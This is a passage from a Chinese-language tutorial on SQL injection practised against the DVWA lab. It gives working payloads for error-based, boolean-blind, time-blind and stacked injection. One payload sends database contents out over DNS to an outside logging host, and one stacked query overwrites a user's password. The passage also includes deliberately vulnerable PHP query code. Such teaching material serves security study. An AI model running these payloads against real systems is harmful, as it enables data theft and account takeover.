&lt;p&gt;所以，我们要适当舍弃一些东西，比如把admin单独拿出来，或者使用**&lt;code&gt;substring()&lt;/code&gt;函数**&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;substring(strings,m,n)&lt;/code&gt;：从strings的第m个字符开始，向后截取n个字符。&lt;/strong&gt;
&lt;strong&gt;&lt;mark&gt;注意&lt;/mark&gt;：1.&lt;code&gt;substring()&lt;/code&gt;的开始位置为1，和&lt;code&gt;limit&lt;/code&gt;不一样！&lt;/strong&gt;
&lt;strong&gt;2.通常&lt;code&gt;substr()&lt;/code&gt;可以代替它，用法也相同；而&lt;code&gt;mid()&lt;/code&gt;总是可以代替它，因为就是它的别名&lt;/strong&gt;
&lt;strong&gt;&lt;mark&gt;substr()=substring()=mid()&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&amp;#39;,&amp;#39;,user,password), 1, 30) from users limit 0,1),0x7e)) #

1&amp;#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&amp;#39;,&amp;#39;,user,password), 31, 30) from users limit 0,1),0x7e)) #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分别得到下面的报错：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;XPATH syntax error: &amp;#39;~admin,5f4dcc3b5aa765d61d8327de~&amp;#39;

XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;拼接得到完整的用户名和密码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;admin,5f4dcc3b5aa765d61d8327deb882cf99
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;利用&lt;code&gt;substring()&lt;/code&gt;，即使字段长度远远大于32，我们也能一点点凑出完整的内容&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;3-盲注&#34;&gt;#3 盲注
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;有的时候存在注入点，但是前端并不会回显注入结果，这就需要用特殊方式判断我们是否注入成功&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;常用函数-2&#34;&gt;常用函数
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;函数&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;用法&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;mid/substr/substring(string, m, n)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;从 m 位置截取string字符串 n 位，初始位置为1，n 可省略&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;length(string)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;返回字符串长度&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;ord(string)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;返回 string 最左面字符的 ASCII 码值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;left(string, len)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;从左截取 string 的前 len 位&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;ascii()&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;将某个字符转换为 ASCII 码值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;if(exp1, exp2, exp3)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;如果 exp1 正确，就执行 exp2 ，否则执行 exp3&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;sleep(time)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;休眠多少秒&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;布尔盲注&#34;&gt;布尔盲注
&lt;/h3&gt;&lt;p&gt;当我们查询的数据在数据库存在时，就会返回：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;User ID exists in the database
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;反之，则会返回：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;User ID is MISSING from the database
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们可以构造一些判别式，观察页面返回值，来判断输入的语句是否为真&lt;/p&gt;
&lt;h4 id=&#34;猜测长度&#34;&gt;猜测长度
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;使用与(and)：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and length(database())=4 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;使用或(or)：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#39; or length(database())=4 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面返回exists，说明数据库名称长度为4&lt;/p&gt;
&lt;p&gt;如果库名实在长，也可以使用&lt;strong&gt;二分法&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and length(database())&amp;gt;4 #
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;猜测库名&#34;&gt;猜测库名
&lt;/h4&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and substring(database(),1,1)=&amp;#39;d&amp;#39; #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果不想使用&lt;code&gt;&#39;&#39;&lt;/code&gt;包裹字母，也可以转换成ascii码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and ascii(substr(database(),1,1))=100 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一步步尝试，直到尝试出完整的数据库名称&lt;/p&gt;
&lt;p&gt;当然，我们在知道ascii码表的情况下，使用二分法更快：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and ascii(substr(database(),1,1))&amp;gt;64 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果substring被过滤了：&lt;a class=&#34;link&#34; href=&#34;#reverse&amp;#43;left%e4%bb%a3%e6%9b%bfsubstring&#34; &gt;reverse+left代替substring
    
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​				       &lt;a class=&#34;link&#34; href=&#34;#trim%e4%bb%a3%e6%9b%bfsubstring&#34; &gt;trim代替substring
    
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;附上一张ascii码表：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/ascii-1-1.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;ASCII 表| 菜鸟教程&#34;
	
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;猜测表的数量&#34;&gt;猜测表的数量
&lt;/h4&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and (select count(table_name) from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39;)=2 #
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;猜测表2的长度&#34;&gt;猜测表2的长度
&lt;/h4&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and length((select table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 1,1))=5#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者把length放在select后面：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and (select length(table_name) from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 1,1)=5#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:20px&#34;&gt;&lt;strong&gt;猜测表名，字段名等等的步骤都大同小异，在此不过多赘述&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;时间盲注&#34;&gt;时间盲注
&lt;/h3&gt;&lt;p&gt;如果页面连exists这样的返回字样都没有怎么办？&lt;/p&gt;
&lt;p&gt;那么，我们就要寻找新的特征，来指示我们语句成功执行了——那就是时间&lt;/p&gt;
&lt;h4 id=&#34;sleep延时&#34;&gt;sleep延时
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;利用if函数和sleep函数，如果语句成功执行，就让页面延时一段时间：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and if(length(database())=4,sleep(5),1)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;注意此处if函数有三个参数，最后一个失败执行的语句exp3不能为空，要填上1补空&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果不用if，也是可以的：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and sleep((ascii(substring(database(),1,1))=100)*5)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面休眠了五秒，说明语句执行成功（sleep()返回了1,1*5=5），数据库名称长为4&lt;/p&gt;
&lt;p&gt;如果if函数被过滤了：[case when语句代替if](#case when语句代替if)&lt;/p&gt;
&lt;h4 id=&#34;benchmark延时&#34;&gt;benchmark延时
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;benchmark(count, exp)：将表达式exp重复执行count次&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;只要我们让执行次数够多，就能达到和sleep一样的延迟效果：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,benchmark(5000000,md5(&amp;#39;a&amp;#39;)),1)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果数据库第一个字符是d，就让数据库计算五百万次a的md5值，这个过程近似五秒&lt;/p&gt;
&lt;h4 id=&#34;笛卡尔积延时&#34;&gt;笛卡尔积延时
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;当查询发生在多个表中，并且没有任何限制条件时，会将多个表已笛卡尔积的形式联合起来：&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 1)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个查询将&lt;code&gt;information_schema.columns&lt;/code&gt;这张表自身进行了两次连接，查询起来很费时（大概要两三秒）&lt;/p&gt;
&lt;p&gt;如果感觉延时不够明显，可以多加几次自连接&lt;/p&gt;
&lt;h4 id=&#34;正则匹配延时&#34;&gt;正则匹配延时
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;通过构造正则表达式，让数据库的正则引擎在进行匹配时陷入大量的回溯计算，从而消耗极长的CPU时间：&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100, (select rpad(&amp;#39;a&amp;#39;,9999999,&amp;#39;a&amp;#39;) RLIKE concat(repeat(&amp;#39;(a.*)+&amp;#39;,30),&amp;#39;b&amp;#39;)), 1)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们来看看其中的正则延时部分是怎么工作的：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select rpad(&amp;#39;a&amp;#39;,4999999,&amp;#39;a&amp;#39;) RLIKE concat(repeat(&amp;#39;(a.*)+&amp;#39;,30),&amp;#39;b&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;rpad(str,len,padstr)&lt;/code&gt;：用字符串&lt;code&gt;padstr&lt;/code&gt;对&lt;code&gt;str&lt;/code&gt;进行右边填补，直至它的长度达到&lt;code&gt;len&lt;/code&gt;，然后返回 &lt;code&gt;str&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​			         &lt;strong&gt;如果&lt;code&gt;str&lt;/code&gt;的长度长于&lt;code&gt;len&lt;/code&gt;，那么它将被截除到&lt;code&gt;len&lt;/code&gt;个字符&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;(a.*)+&lt;/code&gt;：内部的 &lt;code&gt;.*&lt;/code&gt; 和外部的 &lt;code&gt;+&lt;/code&gt; 都是贪婪量词，当正则引擎用这个模式去匹配一个长字符串时，存在指数级的可能性来划分字符串（例如，&lt;code&gt;(a)(a)(a)&lt;/code&gt;、&lt;code&gt;(aa)(a)&lt;/code&gt;、&lt;code&gt;(a)(aa)&lt;/code&gt;等），引擎需要尝试所有这些路径&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;b&lt;/code&gt;: 在模式末尾加上一个源字符串中不存在的字符&lt;code&gt;&#39;b&#39;&lt;/code&gt;，是为了确保正则表达式的匹配最终一定会失败。这会迫使正则引擎耗尽所有可能的回溯路径，从而将延迟时间最大化&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;repeat(str,times)&lt;/code&gt;：字符串&lt;code&gt;str&lt;/code&gt;复制&lt;code&gt;times&lt;/code&gt;次&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;*我在dvwa上使用上述的正则匹配方式无法得到延时结果，如果您知道为什么请留言&amp;gt;&amp;lt;&lt;/p&gt;
&lt;p&gt;参考文章：&lt;a class=&#34;link&#34; href=&#34;https://www.cdxy.me/?p=789&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;MySQL时间盲注五种延时方法
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;span style=&#34;color:red;font-size:20px&#34;&gt;&lt;strong&gt;时间盲注其余的操作顺序和布尔盲注相同，只是换了一种方式实现判断&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;报错盲注&#34;&gt;报错盲注
&lt;/h3&gt;&lt;p&gt;报错盲注的思想和时间盲注相同，都是利用if函数&lt;/p&gt;
&lt;p&gt;不同点在于，报错盲注不依赖页面是否延时判断，而是依赖页面是否报错判断&lt;/p&gt;
&lt;p&gt;sql中存在很多数学计算函数，我们也主要利用他们来实现报错&lt;/p&gt;
&lt;h4 id=&#34;exp&#34;&gt;exp()
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;exp(x)&lt;/code&gt;返回e的x次方，也就是e^x^&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当传递给&lt;code&gt;exp()&lt;/code&gt;的参数过大（在MySQL中约大于&lt;strong&gt;709&lt;/strong&gt;）时，会产生数值越界错误&lt;/p&gt;
&lt;p&gt;我们可以通过位运算符&lt;code&gt;~&lt;/code&gt;运算0获得一个巨大的整数：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,exp(~0),1)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们知道，&lt;code&gt;~0&lt;/code&gt;的结果是64位无符号整数的最大值，远大于709，因此&lt;code&gt;exp()&lt;/code&gt;函数执行时必定会溢出报错：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;DOUBLE value is out of range in &amp;#39;exp(~(0))&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;你也可以选择手动输入一个很大的数字，比如exp(99999)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;同样的，我们也可以不用if函数，只要利用判断的返回值做运算即可：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and exp((ascii(substring(database(),1,1))=100)*99999)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;如果&lt;code&gt;ascii(substring(database(),1,1))=100&lt;/code&gt;为&lt;mark&gt;真&lt;/mark&gt;，那么运算式为&lt;code&gt;exp(1*99999)&lt;/code&gt;，也就是&lt;code&gt;exp(99999)&lt;/code&gt;，就会报错&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;cot&#34;&gt;cot()
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;cot()&lt;/code&gt;是余切三角函数，而众所周知，&lt;code&gt;cot(0)&lt;/code&gt;是不存在的：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,cot(0),1)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;也可以不用if函数：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and cot((ascii(substring(database(),1,1))=100)=0)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;如果&lt;code&gt;ascii(substring(database(),1,1))=100&lt;/code&gt;为&lt;mark&gt;真&lt;/mark&gt;，那么运算式为&lt;code&gt;cot(1=0)&lt;/code&gt;，也就是&lt;code&gt;cot(0)&lt;/code&gt;，就会报错&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;pow&#34;&gt;pow()
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;pow(a,b)&lt;/code&gt;函数用于求a^b^的值&lt;/strong&gt;，相信你已经知道怎么做了：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and if(ascii(substring(database(),1,1))=100,pow(99999,99999),1)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不使用if函数：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and pow((ascii(substring(database(),1,1))=100)+1,99999)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;如果&lt;code&gt;ascii(substring(database(),1,1))=100&lt;/code&gt;为&lt;mark&gt;真&lt;/mark&gt;，那么运算式就是&lt;code&gt;pow(1+1,99999)&lt;/code&gt;,也就是2^99999^，就会报错&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;4-堆叠注入&#34;&gt;#4 堆叠注入
&lt;/h2&gt;&lt;p&gt;有些应用服务执行sql使用的不是&lt;code&gt;mysqli_query()&lt;/code&gt;,而是&lt;code&gt;mysqli_multi_query()&lt;/code&gt;方法，可以做到执行多条sql语句&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果又恰好没有过滤&lt;code&gt;;&lt;/code&gt;，我们就能使用&lt;code&gt;;&lt;/code&gt;分割语句，利用sql语句进行各种操作：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,2;update users set password=123 where id=1--+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样就篡改了密码，可以随便进入sql啦&lt;/p&gt;
&lt;h2 id=&#34;5-dnslog注入&#34;&gt;#5 DNSlog注入
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;DNS在进行域名解析时会留下域名和解析ip的记录(DNSlog)，我们可以利用它显示我们的注入结果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.将想要窃取的数据（如数据库名、用户名等）作为这个域名的子域名拼接到查询中&lt;/p&gt;
&lt;p&gt;2.迫使数据库服务器向一个由我们控制的域名发起DNS查询请求&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DNSLOG注入需要有两个条件：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;目标数据库服务器能够向外网发起DNS请求&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;开启了&lt;code&gt;LOAD_FILE()&lt;/code&gt;读取文件的函数&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;准备dnslog平台&#34;&gt;准备DNSlog平台
&lt;/h3&gt;&lt;p&gt;网络上有很多公开DNSlog的服务，如www.dnslog.cn，或使用BurpSuite自带的BurpCollaborator&lt;/p&gt;
&lt;p&gt;以dnslog.cn为例，&lt;strong&gt;点击&lt;code&gt;Get SubDomain&lt;/code&gt;后，我们会得到一个独一无二的子域名&lt;/strong&gt;，例如：&lt;code&gt;624elh.dnslog.cn&lt;/code&gt;：
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701173327303.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250701173327303&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;构造注入payload&#34;&gt;构造注入Payload
&lt;/h3&gt;&lt;p&gt;我们需要使用数据库中能够触发网络请求的函数，在MySQL中，最常用的是 &lt;code&gt;load_file()&lt;/code&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and load_file(concat(&amp;#39;\\\\&amp;#39;,(select database()),&amp;#39;.624elh.dnslog.cn\\a&amp;#39;))#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当数据库执行这个Payload时，它会尝试使用&lt;code&gt;load_file()&lt;/code&gt;去读取一个网络路径&lt;/p&gt;
&lt;p&gt;&lt;code&gt;concat()&lt;/code&gt;函数会将各部分拼接起来，构造出一个完整的UNC路径：&lt;code&gt;\\dvwa.624elh.dnslog.cn\a&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;注意，这里使用的是&lt;code&gt;\\&lt;/code&gt;，因为需要给&lt;code&gt;\&lt;/code&gt;转义，才能让它被当做普通字符处理&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;为了访问这个网络路径，服务器的操作系统必须先解析主机名 &lt;code&gt;dvwa.624elh.dnslog.cn&lt;/code&gt;，因此它会向DNS服务器发起一个DNS查询请求&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;回到DNSlog，点击&lt;code&gt;Refresh Record&lt;/code&gt;，将会显示出dns解析记录&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这样，数据库名&lt;code&gt;&#39;dvwa&#39;&lt;/code&gt;就作为子域名的一部分，被成功地带到了外部，实现了数据泄露：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701173610414.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250701173610414&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;6-http请求注入&#34;&gt;#6 http请求注入
&lt;/h2&gt;&lt;h3 id=&#34;getpost请求注入&#34;&gt;GET/POST请求注入
&lt;/h3&gt;&lt;p&gt;完整看到这里的你，就会发现上面我们讨论的注入绝大多数都是在GET和POST的场景下&lt;/p&gt;
&lt;p&gt;我们简单句两个例子说明&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;GET请求（查询等）：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;]; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM users WHERE user_id = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$result&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$conn&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们一般是在查询输入框中输入注入语句，其实也可以在url中：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/get_vuln.php?id=1&amp;#39; UNION SELECT 1, user, password FROM users#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;id后面其实就是我们之前在输入框中输入的内容&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;POST请求（登录等）：&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$username&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;];
